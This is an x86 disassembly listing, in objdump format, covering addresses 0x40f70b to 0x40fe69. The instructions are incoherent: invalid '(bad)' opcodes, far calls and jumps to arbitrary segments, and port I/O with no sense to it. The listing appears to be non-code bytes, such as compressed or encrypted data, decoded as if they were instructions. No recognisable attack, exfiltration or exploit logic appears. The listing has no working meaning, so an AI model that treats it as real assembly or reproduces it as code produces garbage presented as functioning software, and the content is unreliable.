  40f70b:	pop    eax
  40f70c:	inc    edx
  40f70d:	sbb    edi,DWORD PTR [eax-0x2855e943]
  40f713:	fcom   DWORD PTR [ebx]
  40f715:	dec    ebp
  40f716:	mov    ah,0x34
  40f718:	push   ds
  40f719:	stc    
  40f71a:	call   FWORD PTR [ebx+edi*8-0x236efb6a]
  40f721:	test   DWORD PTR [ebx+edi*8+0x5e9a8cbb],eax
  40f728:	mov    ah,0x44
  40f72a:	adc    al,BYTE PTR [eax]
  40f72c:	dec    edx
  40f72d:	lea    ecx,[edi+0x45c37b56]
  40f733:	fisub  WORD PTR [ebp+0x5e13d29e]
  40f739:	cmp    DWORD PTR ds:0x326090cb,esi
  40f73f:	pop    esp
  40f740:	loopne 0x40f7a3
  40f742:	mov    ebx,0xbd0f0462
  40f747:	sub    BYTE PTR [ebp+0x2b861bfd],dl
  40f74d:	xchg   edi,eax
  40f74e:	and    ebp,DWORD PTR [edi-0x52]
  40f751:	xchg   edx,eax
  40f752:	xchg   esi,eax
  40f753:	imul   esp,DWORD PTR [ecx-0x24],0x24ef63c8
  40f75a:	or     ecx,DWORD PTR [esi+0x70e85327]
  40f760:	jle    0x40f72b
  40f762:	adc    DWORD PTR [edi],eax
  40f764:	les    ebp,FWORD PTR [eax-0x4c]
  40f767:	aad    0xa9
  40f769:	sub    eax,0x539b99eb
  40f76e:	in     al,dx
  40f76f:	and    DWORD PTR [ebx+0x5b],eax
  40f772:	loope  0x40f768
  40f774:	xchg   eax,edi
  40f776:	jmp    0x40f7f5
  40f778:	and    eax,0xab8b6c3a
  40f77d:	fisttp WORD PTR [ebx+0x53ee5b52]
  40f783:	lods   eax,DWORD PTR ds:[esi]
  40f784:	cwde   
  40f785:	clc    
  40f786:	dec    esp
  40f787:	ss jg  0x40f70b
  40f78a:	dec    edi
  40f78b:	jae    0x40f76f
  40f78d:	out    0xd8,al
  40f78f:	and    cl,BYTE PTR [esi-0xfb63c0f]
  40f795:	out    0x5e,eax
  40f797:	fimul  WORD PTR [eax-0xa]
  40f79a:	mov    ebx,DWORD PTR [edi-0x7f]
  40f79d:	arpl   WORD PTR [edx],di
  40f79f:	push   DWORD PTR [edx-0x3a]
  40f7a2:	add    al,0x16
  40f7a4:	or     cl,al
  40f7a6:	or     ebp,eax
  40f7a8:	add    BYTE PTR [eax],dh
  40f7aa:	fistp  DWORD PTR [edx-0x1f]
  40f7ad:	add    BYTE PTR [eax+0x6c5c7e42],cl
  40f7b3:	out    dx,al
  40f7b4:	mov    edx,DWORD PTR ds:0x2472f9e3
  40f7ba:	add    DWORD PTR [esi-0x53ce534a],0x11
  40f7c1:	pop    ebx
  40f7c2:	sub    BYTE PTR [edi+0x4c],cl
  40f7c5:	bound  ax,DWORD PTR [ebx]
  40f7c8:	ss ds ins DWORD PTR es:[edi],dx
  40f7cb:	xchg   DWORD PTR [eax+0x24],ecx
  40f7ce:	adc    ah,BYTE PTR [edx]
  40f7d0:	je     0x40f77d
  40f7d2:	bound  eax,QWORD PTR es:[ebx-0x2ab25911]
  40f7d9:	pop    ss
  40f7da:	fcom   DWORD PTR [eax+0x4ed0c966]
  40f7e0:	jp     0x40f7de
  40f7e2:	sub    BYTE PTR [ebx],ch
  40f7e4:	dec    esp
  40f7e5:	leave  
  40f7e6:	pusha  
  40f7e7:	fsub   st,st(4)
  40f7e9:	xor    cl,bh
  40f7eb:	mov    BYTE PTR [ebp-0x7c3d605b],bh
  40f7f1:	call   0x2336b6ba
  40f7f6:	std    
  40f7f7:	xor    al,0xe5
  40f7f9:	stos   DWORD PTR es:[edi],eax
  40f7fa:	xor    eax,eax
  40f7fc:	sub    dh,BYTE PTR [ebp-0x7e]
  40f7ff:	nop
  40f800:	repz mov edi,esi
  40f803:	mov    eax,ds:0x71fdbe47
  40f808:	icebp  
  40f809:	and    DWORD PTR [ebx],edx
  40f80b:	inc    ebp
  40f80c:	std    
  40f80d:	jnp    0x40f84a
  40f80f:	test   DWORD PTR [ebp-0x17359b0c],0xcd7123ce
  40f819:	sbb    al,0xf8
  40f81b:	scas   eax,DWORD PTR es:[edi]
  40f81c:	dec    eax
  40f81d:	aaa    
  40f81e:	xchg   cl,al
  40f820:	add    eax,0xead7a2f2
  40f825:	xor    edi,eax
  40f827:	mov    ecx,0xd20ab3e2
  40f82c:	mov    ds:0x49256321,eax
  40f831:	dec    ebx
  40f832:	sub    ecx,DWORD PTR [edx]
  40f834:	cld    
  40f835:	and    BYTE PTR [ebp+0x3b6f7461],ah
  40f83b:	fwait
  40f83c:	imul   edi,ebx,0xffffffcf
  40f83f:	jp     0x40f7ca
  40f841:	mov    al,0xa6
  40f843:	lds    esp,FWORD PTR [ecx+0x520857cf]
  40f849:	mov    ah,0x6b
  40f84b:	sahf   
  40f84c:	sbb    al,BYTE PTR [ebx]
  40f84e:	retf   0xb641
  40f851:	cmp    eax,0xe3404d7e
  40f856:	in     al,dx
  40f857:	clc    
  40f858:	cmp    eax,0x68a00765
  40f85d:	pop    ds
  40f85e:	mov    BYTE PTR [edx+0x37],0x49
  40f862:	xor    DWORD PTR ds:0x5551c124,ebp
  40f868:	add    al,0x24
  40f86a:	dec    edi
  40f86b:	mov    ds:0x77e5b8dc,eax
  40f870:	out    dx,al
  40f871:	add    DWORD PTR [ebx],eax
  40f873:	in     al,0x46
  40f875:	test   bl,bh
  40f877:	test   cl,dh
  40f879:	cli    
  40f87a:	inc    ebp
  40f87b:	dec    esi
  40f87c:	ret    
  40f87d:	mov    bh,0x28
  40f87f:	clc    
  40f880:	sbb    al,0xb1
  40f882:	xchg   ebx,eax
  40f883:	pop    ss
  40f884:	out    0xfb,eax
  40f886:	add    bl,BYTE PTR [edi+0x35]
  40f889:	pop    es
  40f88a:	fbstp  TBYTE PTR [ebp+0x7b]
  40f88d:	test   DWORD PTR [esp+ecx*8],ebx
  40f890:	add    BYTE PTR [ebp-0x4de97d95],al
  40f896:	mov    dh,0xee
  40f898:	enter  0x3693,0x10
  40f89c:	enter  0xafc4,0x1a
  40f8a0:	pop    eax
  40f8a1:	rcl    DWORD PTR [edx-0x4a58f653],cl
  40f8a7:	cdq    
  40f8a8:	mov    edi,0x14c3ff5d
  40f8ad:	inc    esi
  40f8ae:	xchg   DWORD PTR [edi-0x381e20d4],ecx
  40f8b4:	or     eax,0x583e1df4
  40f8b9:	fs call 0xe6bdbe82
  40f8bf:	test   DWORD PTR [edx+0xf],eax
  40f8c2:	shr    DWORD PTR [eax],0x23
  40f8c5:	xor    BYTE PTR [ebp+ebp*4+0x1f],ch
  40f8c9:	pop    ds
  40f8ca:	xor    eax,0x1ceb1952
  40f8cf:	jge    0x40f892
  40f8d1:	hlt    
  40f8d2:	sub    esi,DWORD PTR [esi+0x68]
  40f8d5:	cmp    BYTE PTR [ebx],0x90
  40f8d8:	xor    dh,bl
  40f8da:	dec    ebx
  40f8db:	enter  0x5ed7,0x4f
  40f8df:	imul   edi,DWORD PTR [esi-0x70c12b],0x13abdef9
  40f8e9:	push   eax
  40f8ea:	xchg   BYTE PTR [edx-0x79],dh
  40f8ed:	daa    
  40f8ee:	inc    esp
  40f8ef:	test   edi,0xa46febd9
  40f8f5:	adc    ch,dh
  40f8f7:	outs   dx,BYTE PTR ds:[esi]
  40f8f8:	xor    edi,DWORD PTR [ebp-0x44153910]
  40f8fe:	fs jecxz 0x40f8a1
  40f901:	inc    ecx
  40f902:	cdq    
  40f903:	pop    ss
  40f904:	cmp    bl,BYTE PTR [ecx-0x78]
  40f907:	xchg   ebp,eax
  40f908:	ficomp WORD PTR [ecx+ecx*8]
  40f90b:	call   0x3d3a:0x5fe6e0bf
  40f912:	cmc    
  40f913:	aam    0xaf
  40f915:	pop    eax
  40f916:	xchg   esi,eax
  40f917:	enter  0x731b,0xa7
  40f91b:	mov    ecx,0xca974b48
  40f920:	mov    eax,0x76d45a59
  40f925:	retf   0x6591
  40f928:	and    eax,0xfb1165ee
  40f92d:	sbb    ebp,DWORD PTR [ebx+0x23]
  40f930:	sbb    al,0x5
  40f932:	add    al,0x6d
  40f934:	fisub  WORD PTR [ebp+0x79]
  40f937:	rol    ebp,cl
  40f939:	adc    al,0xbc
  40f93b:	cld    
  40f93c:	(bad)  
  40f93d:	out    dx,eax
  40f93e:	mov    ebx,edx
  40f940:	stos   DWORD PTR es:[edi],eax
  40f941:	dec    esi
  40f942:	sti    
  40f943:	das    
  40f944:	mov    eax,0x5f2f27e2
  40f949:	not    DWORD PTR [edx]
  40f94b:	test   al,0x32
  40f94d:	test   DWORD PTR [edi+0x4d6bfafd],ebp
  40f953:	inc    ebx
  40f954:	jnp    0x40f973
  40f956:	and    eax,ecx
  40f958:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f959:	cmp    ch,BYTE PTR [edi-0x6a]
  40f95c:	xchg   edx,eax
  40f95d:	mov    edi,DWORD PTR [edx-0x6a5cc199]
  40f963:	mul    DWORD PTR [ebp+0x58a82a3a]
  40f969:	ss icebp 
  40f96b:	xor    al,0xba
  40f96d:	jnp    0x40f91f
  40f96f:	fs in  eax,dx
  40f971:	leave  
  40f972:	dec    edi
  40f973:	retf   0xb86b
  40f976:	pusha  
  40f977:	sbb    al,dh
  40f979:	cmp    ah,dl
  40f97b:	pop    edx
  40f97c:	in     al,0xd3
  40f97e:	addr16 repnz inc ebp
  40f981:	iret   
  40f982:	sub    bl,0x65
  40f985:	repz fistp QWORD PTR [ebp-0x71]
  40f989:	xor    cl,BYTE PTR [ecx]
  40f98b:	out    0x7e,al
  40f98d:	adc    BYTE PTR [esi],dh
  40f98f:	in     al,0x60
  40f991:	dec    ebp
  40f992:	sbb    ebx,edx
  40f994:	mov    cl,0x80
  40f996:	nop/reserved BYTE PTR [ebx]
  40f999:	pop    ds
  40f99a:	cmp    eax,0xff9906f1
  40f99f:	mov    edx,esi
  40f9a1:	outs   dx,BYTE PTR ds:[esi]
  40f9a2:	dec    ebx
  40f9a3:	mov    eax,0x52412b2d
  40f9a8:	out    dx,al
  40f9a9:	shl    BYTE PTR [edx+0x4e],0x2f
  40f9ad:	popa   
  40f9ae:	test   al,0x75
  40f9b0:	retf   0xedc2
  40f9b3:	loope  0x40fa08
  40f9b5:	out    dx,al
  40f9b6:	cld    
  40f9b7:	iret   
  40f9b8:	adc    al,0x6b
  40f9ba:	cmp    esi,esp
  40f9bc:	call   0x9b63:0xf45eb3cb
  40f9c3:	push   ss
  40f9c4:	inc    eax
  40f9c5:	xor    esi,ebp
  40f9c7:	imul   BYTE PTR [ebx-0x61f78c4f]
  40f9cd:	(bad)  
  40f9ce:	sub    DWORD PTR [eax-0x4825e4e4],ecx
  40f9d4:	pop    ds
  40f9d5:	(bad)  
  40f9d6:	sti    
  40f9d7:	ja     0x40fa0a
  40f9d9:	clc    
  40f9da:	inc    ebx
  40f9db:	adc    eax,0x9a2efe75
  40f9e0:	scas   al,BYTE PTR es:[edi]
  40f9e1:	or     al,0x70
  40f9e3:	out    0x66,al
  40f9e5:	sub    al,0xc7
  40f9e7:	call   0xa328:0x4194afcd
  40f9ee:	rcl    DWORD PTR [eax-0x22562c12],cl
  40f9f4:	xchg   edx,eax
  40f9f5:	inc    edi
  40f9f6:	test   al,0x4a
  40f9f8:	inc    ebp
  40f9f9:	jbe    0x40f9fa
  40f9fb:	push   edx
  40f9fc:	out    0xaf,al
  40f9fe:	or     BYTE PTR [ecx+0x20],ah
  40fa01:	sub    BYTE PTR [esi+0xc],bh
  40fa04:	fcomp  QWORD PTR [esi]
  40fa06:	mov    esi,0xa1a6b88
  40fa0b:	in     al,dx
  40fa0c:	ins    BYTE PTR es:[edi],dx
  40fa0d:	push   ebp
  40fa0e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fa0f:	mov    esi,?
  40fa11:	(bad)  
  40fa12:	scas   al,BYTE PTR es:[edi]
  40fa13:	pop    esp
  40fa14:	sub    eax,0xc6bbb248
  40fa19:	xchg   ebx,eax
  40fa1a:	dec    ecx
  40fa1b:	dec    eax
  40fa1c:	sub    DWORD PTR [edx+0x1b507de7],ecx
  40fa22:	ins    BYTE PTR es:[edi],dx
  40fa23:	mov    ds:0xa82d78a4,eax
  40fa28:	mov    dh,0x3d
  40fa2a:	shl    DWORD PTR [ebp+0x3],1
  40fa2d:	xchg   edi,eax
  40fa2e:	add    al,0x19
  40fa30:	xchg   DWORD PTR [edi-0x30],ebp
  40fa33:	xchg   edi,eax
  40fa34:	jge    0x40faa4
  40fa36:	dec    esi
  40fa37:	push   ecx
  40fa38:	add    DWORD PTR [ebx-0x6dc9cbd4],ecx
  40fa3e:	add    eax,0x2fb98e14
  40fa43:	dec    edi
  40fa44:	sahf   
  40fa45:	aas    
  40fa46:	jae    0x40f9da
  40fa48:	dec    edx
  40fa49:	xchg   esi,eax
  40fa4a:	addr16 and al,0x75
  40fa4d:	mov    ecx,0x21ed6e3c
  40fa52:	aad    0xc4
  40fa54:	cdq    
  40fa55:	in     eax,0x9a
  40fa57:	sbb    ch,BYTE PTR [ebp+0x39]
  40fa5a:	cmp    al,dl
  40fa5c:	cwde   
  40fa5d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fa5e:	ds aam 0x65
  40fa61:	push   0x7d8eaace
  40fa66:	add    DWORD PTR [edx],ecx
  40fa68:	cmc    
  40fa69:	(bad)  
  40fa6a:	mov    ah,0x6e
  40fa6c:	jp     0x40fa34
  40fa6e:	jg     0x40fa08
  40fa70:	push   ds
  40fa71:	xlat   BYTE PTR ds:[ebx]
  40fa72:	loope  0x40fa4f
  40fa74:	sbb    al,0xc4
  40fa76:	mov    ecx,0xf0befe4d
  40fa7b:	add    edx,DWORD PTR [eax+0x4]
  40fa7e:	adc    BYTE PTR ss:[edi],ah
  40fa81:	imul   ebx,DWORD PTR [ecx+0x4a],0x7730a9a5
  40fa88:	xor    ecx,DWORD PTR [edi]
  40fa8a:	cmp    ecx,ecx
  40fa8c:	loopne 0x40fa76
  40fa8e:	adc    al,BYTE PTR [ebp+0x32ae2d81]
  40fa94:	or     eax,0xd1374e4f
  40fa99:	mov    ebp,eax
  40fa9b:	xchg   esi,eax
  40fa9c:	xchg   edi,eax
  40fa9d:	fisttp QWORD PTR [esi+0x4bfc1ff4]
  40faa3:	into   
  40faa4:	push   ebx
  40faa5:	icebp  
  40faa6:	int    0x55
  40faa8:	mov    edx,0x1bb54b73
  40faad:	pop    edx
  40faae:	addr16 sbb dl,ah
  40fab1:	nop
  40fab2:	push   ss
  40fab3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fab4:	pop    ss
  40fab5:	xchg   esp,eax
  40fab6:	add    al,BYTE PTR [edx-0x66]
  40fab9:	out    dx,al
  40faba:	and    ebp,0xb57c77be
  40fac0:	and    al,0x9d
  40fac2:	ret    
  40fac3:	or     esi,esp
  40fac5:	jnp    0x40fb0b
  40fac7:	test   DWORD PTR [edx+0x40e7e0bd],ecx
  40facd:	dec    ebp
  40face:	xchg   edx,eax
  40facf:	daa    
  40fad0:	rol    DWORD PTR [edx+0x2c],cl
  40fad3:	add    ebp,DWORD PTR [ecx]
  40fad5:	push   es
  40fad6:	push   ds
  40fad7:	dec    ebp
  40fad8:	fnstenv [ecx+0x58]
  40fadb:	stos   DWORD PTR es:[edi],eax
  40fadc:	ins    BYTE PTR es:[edi],dx
  40fadd:	pop    edi
  40fade:	mov    ebx,0x3f305463
  40fae3:	loope  0x40fae8
  40fae5:	js     0x40fab5
  40fae7:	or     al,0xd1
  40fae9:	or     DWORD PTR [eax],eax
  40faeb:	dec    esi
  40faec:	or     ah,BYTE PTR [ecx+0x71]
  40faef:	(bad)  
  40faf0:	jp     0x40fb44
  40faf2:	jbe    0x40fa92
  40faf4:	outs   dx,DWORD PTR ds:[esi]
  40faf5:	mov    ds:0xd0cf8a80,eax
  40fafa:	pop    ds
  40fafb:	cwde   
  40fafc:	cld    
  40fafd:	add    DWORD PTR [ebx-0x68],edi
  40fb00:	push   eax
  40fb01:	jo     0x40fb68
  40fb03:	push   eax
  40fb04:	adc    ch,BYTE PTR [ebp-0x80]
  40fb07:	(bad)  
  40fb09:	dec    edi
  40fb0a:	mov    ds:0x328d9768,al
  40fb0f:	xchg   edx,eax
  40fb10:	arpl   WORD PTR [esi-0x50],cx
  40fb13:	pop    ecx
  40fb14:	lea    ebx,[eax-0x6]
  40fb17:	fnsave [ebx+0x314c03a2]
  40fb1d:	xor    eax,0xc17c313e
  40fb22:	dec    edi
  40fb23:	and    DWORD PTR [eax-0x73ce71c4],esi
  40fb29:	fcomi  st,st(3)
  40fb2b:	arpl   WORD PTR [edx+0x489c0c6c],sp
  40fb31:	ror    BYTE PTR [edx-0x372f4bf0],0xf0
  40fb38:	inc    edx
  40fb39:	pop    esi
  40fb3a:	pop    es
  40fb3b:	pop    ebp
  40fb3c:	and    DWORD PTR [esi-0x676b94ad],edx
  40fb42:	std    
  40fb43:	jmp    0xed96:0xf2edb014
  40fb4a:	cmp    edx,DWORD PTR [edi-0x155f3578]
  40fb50:	push   eax
  40fb51:	enter  0x6697,0x4f
  40fb55:	loop   0x40fae7
  40fb57:	loop   0x40fb3f
  40fb59:	ficom  WORD PTR [esi]
  40fb5b:	sbb    DWORD PTR [ebx+0x4323de73],ebp
  40fb61:	sbb    BYTE PTR [edi+0x67],dh
  40fb64:	cld    
  40fb65:	xor    eax,0x3f8daafa
  40fb6a:	add    DWORD PTR [ecx],edx
  40fb6c:	push   eax
  40fb6d:	(bad)  
  40fb6e:	mov    BYTE PTR [edi],ah
  40fb70:	jne    0x40fbea
  40fb72:	fmul   st(3),st
  40fb74:	fwait
  40fb75:	test   al,0x8e
  40fb77:	add    BYTE PTR [esi+ebp*2],dh
  40fb7a:	adc    eax,0x7888ee80
  40fb7f:	cdq    
  40fb80:	jae    0x40fb30
  40fb82:	mov    edi,0x8969b190
  40fb87:	sar    BYTE PTR [eax-0x4b0d13dc],1
  40fb8d:	mov    dl,al
  40fb8f:	imul   edx,DWORD PTR [eax+0x44],0x7c
  40fb93:	xlat   BYTE PTR ds:[ebx]
  40fb94:	pop    ebx
  40fb95:	push   cs
  40fb96:	adc    eax,0xddc40b50
  40fb9b:	ror    ah,0x7b
  40fb9e:	xlat   BYTE PTR ds:[ebx]
  40fb9f:	xchg   ecx,eax
  40fba0:	or     DWORD PTR [ecx+0x2b938b04],edx
  40fba6:	xor    ch,BYTE PTR [esi-0x2b]
  40fba9:	add    al,0xf1
  40fbab:	sub    bh,BYTE PTR [esi-0x4b]
  40fbae:	outs   dx,DWORD PTR ds:[esi]
  40fbaf:	je     0x40fb3b
  40fbb1:	scas   eax,DWORD PTR es:[edi]
  40fbb2:	add    edx,ebp
  40fbb4:	or     ebx,DWORD PTR [ebp-0xe]
  40fbb7:	jnp    0x40fb4c
  40fbb9:	ins    BYTE PTR es:[edi],dx
  40fbba:	ret    0x79ed
  40fbbd:	xchg   edx,eax
  40fbbe:	or     DWORD PTR [ecx+0x3662b670],eax
  40fbc4:	out    0x2b,al
  40fbc6:	inc    edx
  40fbc7:	ja     0x40fb9f
  40fbc9:	mov    esi,0xeed59270
  40fbce:	outs   dx,DWORD PTR ds:[esi]
  40fbcf:	push   eax
  40fbd0:	cmp    cl,dl
  40fbd2:	(bad)
  40fbd5:	add    eax,0x9025cbcf
  40fbda:	cli    
  40fbdb:	sar    BYTE PTR [eax],cl
  40fbdd:	cs sti 
  40fbdf:	adc    al,0x29
  40fbe1:	adc    ebp,DWORD PTR [ecx+0x764df2f1]
  40fbe7:	lahf   
  40fbe8:	sahf   
  40fbe9:	scas   al,BYTE PTR es:[edi]
  40fbea:	or     bh,BYTE PTR [edi-0x62]
  40fbed:	dec    esp
  40fbee:	cmp    BYTE PTR [eax-0x65abd584],dl
  40fbf4:	test   DWORD PTR [ebp-0x42],0x172f8500
  40fbfb:	and    bl,BYTE PTR [edi+edi*8-0x2b]
  40fbff:	cmp    DWORD PTR [ebx],eax
  40fc01:	leave  
  40fc02:	dec    ecx
  40fc03:	nop
  40fc04:	push   eax
  40fc05:	inc    esp
  40fc06:	aam    0x53
  40fc08:	mov    esi,0xe2425556
  40fc0d:	xor    al,0x6
  40fc0f:	mov    al,BYTE PTR [esi+ebx*1-0x21]
  40fc13:	lods   eax,DWORD PTR ds:[esi]
  40fc14:	dec    esi
  40fc15:	int3   
  40fc16:	mov    al,ds:0xf8304303
  40fc1b:	neg    BYTE PTR [eax+0x70]
  40fc1e:	sar    BYTE PTR [ecx+0x7f],1
  40fc21:	pop    ebp
  40fc22:	pushw  cs
  40fc24:	idiv   DWORD PTR [eax*1+0x454216ff]
  40fc2b:	push   0x3e
  40fc2d:	jg     0x40fbb6
  40fc2f:	shl    DWORD PTR [edx],cl
  40fc31:	jp     0x40fbc9
  40fc33:	xor    eax,0xf2f53db
  40fc38:	out    0xb2,eax
  40fc3a:	ffreep st(0)
  40fc3c:	and    DWORD PTR [edi+0x5bf0518b],edi
  40fc42:	inc    ebx
  40fc43:	xor    dh,BYTE PTR [edx]
  40fc45:	cmp    eax,0x55a8de3b
  40fc4a:	push   edx
  40fc4b:	sbb    dl,BYTE PTR [edx]
  40fc4d:	push   esp
  40fc4e:	data16 jl 0x40fc87
  40fc51:	mov    bl,0x65
  40fc53:	mov    ecx,0x20288bdd
  40fc58:	scas   al,BYTE PTR es:[edi]
  40fc59:	adc    DWORD PTR [eax-0x5f],0x31772952
  40fc60:	mov    ecx,0xae526e1a
  40fc65:	pop    eax
  40fc66:	(bad)  
  40fc67:	jle    0x40fc22
  40fc69:	push   0x1dbb1022
  40fc6e:	retf   
  40fc6f:	hlt    
  40fc70:	inc    ebp
  40fc71:	adc    edi,DWORD PTR ds:0xb4d4a2bc
  40fc77:	xor    bh,cl
  40fc79:	sbb    edx,DWORD PTR [edx+0x68]
  40fc7c:	pop    edx
  40fc7d:	shl    edi,cl
  40fc7f:	sub    al,0xe9
  40fc81:	js     0x40fcf8
  40fc83:	pop    ds
  40fc84:	mov    al,ds:0x589ff003
  40fc89:	jl     0x40fc12
  40fc8b:	shl    cl,0x72
  40fc8e:	sbb    al,0x43
  40fc90:	mov    eax,0xd5aae8de
  40fc95:	pop    ds
  40fc96:	sbb    al,0x46
  40fc98:	fbld   TBYTE PTR [ebx+0x31]
  40fc9b:	mov    ebp,0x9b4ecc30
  40fca0:	push   esi
  40fca1:	call   0xf96058ef
  40fca6:	adc    bh,dl
  40fca8:	mov    ebp,0x7cba254
  40fcad:	fsubr  QWORD PTR [ebp+esi*4+0x65444a60]
  40fcb4:	cwde   
  40fcb5:	ss ret 0x6911
  40fcb9:	mov    edi,0xfdaa38e3
  40fcbe:	xchg   ebx,eax
  40fcbf:	popf   
  40fcc0:	cmp    ah,0xb8
  40fcc3:	and    DWORD PTR [ebx+0x16],ebp
  40fcc6:	sbb    DWORD PTR [ebp+0x17],ecx
  40fcc9:	cmp    BYTE PTR [eax+0x24c66fa9],ch
  40fccf:	je     0x40fce5
  40fcd1:	push   cs
  40fcd2:	sub    DWORD PTR [eax],ebp
  40fcd4:	sbb    al,0x29
  40fcd6:	or     eax,0x244b9280
  40fcdb:	jnp    0x40fcdb
  40fcdd:	pop    ds
  40fcde:	mov    ebx,0x7b56b1d4
  40fce3:	sbb    DWORD PTR [esi],ebp
  40fce5:	ret    
  40fce6:	ret    0x4fcb
  40fce9:	dec    edi
  40fcea:	(bad)  
  40fcec:	pop    ebx
  40fced:	inc    ecx
  40fcee:	mov    bh,bh
  40fcf0:	ss retf 
  40fcf2:	inc    ecx
  40fcf3:	xorps  xmm5,XMMWORD PTR ds:0x93656cc5
  40fcfa:	push   ds
  40fcfb:	pop    ds
  40fcfc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fcfd:	adc    bl,BYTE PTR [ebx-0x50]
  40fd00:	xchg   edx,eax
  40fd01:	pop    esi
  40fd02:	and    al,0x62
  40fd04:	push   ebp
  40fd05:	aas    
  40fd06:	(bad)  
  40fd07:	xchg   ebp,eax
  40fd08:	pop    esp
  40fd09:	pop    esp
  40fd0a:	dec    esp
  40fd0b:	push   0x8271511d
  40fd10:	push   edx
  40fd11:	mov    edi,0x2b618c1e
  40fd16:	and    DWORD PTR [ecx-0x59],0x5c
  40fd1a:	xchg   esi,eax
  40fd1b:	jnp    0x40fcda
  40fd1d:	inc    esp
  40fd1e:	xchg   esi,eax
  40fd1f:	push   esi
  40fd20:	test   al,0x98
  40fd22:	call   0x74b9f4ae
  40fd27:	mov    cl,0xcb
  40fd29:	inc    esp
  40fd2a:	das    
  40fd2b:	push   ds
  40fd2c:	fwait
  40fd2d:	or     BYTE PTR [esi],0xe7
  40fd30:	retf   0xe35e
  40fd33:	cld    
  40fd34:	adc    eax,0x3d745392
  40fd39:	jg     0x40fd8a
  40fd3b:	aam    0x1c
  40fd3d:	je     0x40fce4
  40fd3f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fd40:	pusha  
  40fd41:	test   edx,0x565ed0b4
  40fd47:	mov    edx,0x94272800
  40fd4c:	das    
  40fd4d:	mov    cl,0x22
  40fd4f:	jmp    0x40fda2
  40fd51:	dec    esp
  40fd52:	pop    ds
  40fd53:	xchg   ebp,eax
  40fd54:	pop    edi
  40fd55:	sbb    edi,esi
  40fd57:	nop
  40fd58:	xchg   DWORD PTR [ebp+0x15],ebp
  40fd5b:	loope  0x40fda6
  40fd5d:	and    eax,0x9f906b87
  40fd62:	mov    edi,0x59560ece
  40fd67:	and    al,0xac
  40fd69:	popf   
  40fd6a:	add    esp,DWORD PTR [edx+0x5d58bfc]
  40fd70:	int3   
  40fd71:	or     BYTE PTR [edi-0x27af9899],bh
  40fd77:	cwde   
  40fd78:	popa   
  40fd79:	out    dx,eax
  40fd7a:	sub    edi,DWORD PTR [esi+0x577c5ed8]
  40fd80:	(bad)  
  40fd81:	ds pop esi
  40fd83:	cmp    dl,BYTE PTR [esi+0x64ce03ab]
  40fd89:	cmp    ebp,DWORD PTR [ebx+0x66c498bf]
  40fd8f:	cmc    
  40fd90:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fd91:	fmul   st(3),st
  40fd93:	(bad)  
  40fd94:	imul   esp,DWORD PTR [edi],0xffffffbf
  40fd97:	lods   eax,DWORD PTR ds:[esi]
  40fd98:	jae    0x40fdfd
  40fd9a:	add    BYTE PTR [esi-0x5d4a6cdc],0x9e
  40fda1:	sbb    DWORD PTR [ebp-0xd],ebx
  40fda4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fda5:	aad    0x2d
  40fda7:	enter  0x26cd,0xa9
  40fdab:	push   edi
  40fdac:	fild   QWORD PTR [edx-0x2c]
  40fdaf:	push   eax
  40fdb0:	xchg   edx,eax
  40fdb1:	xchg   esp,eax
  40fdb2:	int3   
  40fdb3:	aas    
  40fdb4:	(bad)  
  40fdb5:	jns    0x40fdf9
  40fdb7:	mov    bl,0x17
  40fdb9:	dec    edi
  40fdba:	inc    cx
  40fdbc:	push   esi
  40fdbd:	sbb    eax,0x42a1eccf
  40fdc2:	in     eax,dx
  40fdc3:	push   0xffffffd2
  40fdc5:	inc    ebx
  40fdc6:	aaa    
  40fdc7:	gs sub al,ah
  40fdca:	jns    0x40fd92
  40fdcc:	xor    bh,BYTE PTR [edi-0x7639946c]
  40fdd2:	or     eax,0x3378444c
  40fdd7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fdd8:	pop    es
  40fdd9:	push   ds
  40fdda:	mov    dl,0x62
  40fddc:	xor    eax,ebx
  40fdde:	ds dec ecx
  40fde0:	loop   0x40fe43
  40fde2:	dec    esp
  40fde3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fde4:	clc    
  40fde5:	stc    
  40fde6:	neg    al
  40fde8:	mov    bh,0x6
  40fdea:	mov    edx,0x51d19e08
  40fdef:	shl    esp,cl
  40fdf1:	mov    edi,0x7756c72
  40fdf6:	stos   BYTE PTR es:[edi],al
  40fdf7:	imul   edi,DWORD PTR [ebx-0x5a357715],0x65
  40fdfe:	push   0xf2c6b92d
  40fe03:	loopne 0x40fe70
  40fe05:	dec    eax
  40fe06:	popf   
  40fe07:	jo     0x40fe0b
  40fe09:	xchg   BYTE PTR [ecx*1+0x4ef3749c],dl
  40fe10:	pop    esp
  40fe11:	and    ah,BYTE PTR [edx-0x703995f1]
  40fe17:	inc    esp
  40fe18:	icebp  
  40fe19:	jae    0x40fdd4
  40fe1b:	push   ebp
  40fe1c:	xor    dh,ch
  40fe1e:	mov    BYTE PTR [edi],bh
  40fe20:	adc    BYTE PTR [edi+ebp*8],0xc1
  40fe24:	mov    dl,0x9e
  40fe26:	xchg   ecx,eax
  40fe27:	imul   esi,DWORD PTR [ecx-0x4d0ea1fa],0x3b6297ca
  40fe31:	pop    edi
  40fe32:	push   ds
  40fe33:	outs   dx,DWORD PTR ds:[esi]
  40fe34:	xor    ebp,edx
  40fe36:	iret   
  40fe37:	lods   al,BYTE PTR ds:[esi]
  40fe38:	cwde   
  40fe39:	inc    edx
  40fe3a:	scas   al,BYTE PTR es:[edi]
  40fe3b:	fisub  DWORD PTR cs:[esi+0x68]
  40fe3f:	push   ss
  40fe40:	mov    al,cs:0xc649fac
  40fe46:	loope  0x40fe0d
  40fe48:	sbb    eax,0xd799a514
  40fe4d:	xchg   ecx,eax
  40fe4e:	push   ebx
  40fe4f:	adc    BYTE PTR [edx],ah
  40fe51:	imul   ecx,edx,0x9df371ee
  40fe57:	and    esi,ecx
  40fe59:	add    al,0x8
  40fe5b:	ins    BYTE PTR es:[edi],dx
  40fe5c:	push   edi
  40fe5d:	jmp    0x7ce4:0xa06af13b
  40fe64:	push   0x9ec6ab9e
  40fe69:	inc    ebx
